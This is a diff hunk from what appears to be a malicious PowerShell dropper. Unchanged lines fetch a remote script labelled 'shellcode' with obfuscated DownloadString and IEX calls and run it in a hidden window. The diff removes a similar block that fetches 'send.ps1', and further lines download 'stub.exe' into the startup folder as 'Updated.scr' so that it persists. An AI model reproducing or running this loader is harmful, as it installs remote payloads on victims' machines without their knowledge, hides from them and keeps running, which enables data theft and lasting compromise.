@@ -50,9 +50,6 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/sh
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/other/send.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
 $output = "$startupfolder\Updated.scr"
